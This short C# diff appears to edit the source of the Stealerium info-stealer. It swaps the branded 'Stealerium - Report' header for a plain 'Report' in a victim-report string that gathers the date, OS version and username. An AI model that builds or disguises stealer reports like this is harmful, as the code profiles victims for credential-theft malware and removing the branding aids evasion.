@@ -16,7 +16,7 @@ namespace Plugin
         {
             // Get info
             var info = "```"
-                       + "\n😹 *Stealerium - Report:*"
+                       + "\n😹 * Report *"
                        + "\nDate: " + SystemInfo.Datenow
                        + "\nSystem: " + SystemInfo.GetSystemVersion()
                        + "\nUsername: " + SystemInfo.Username
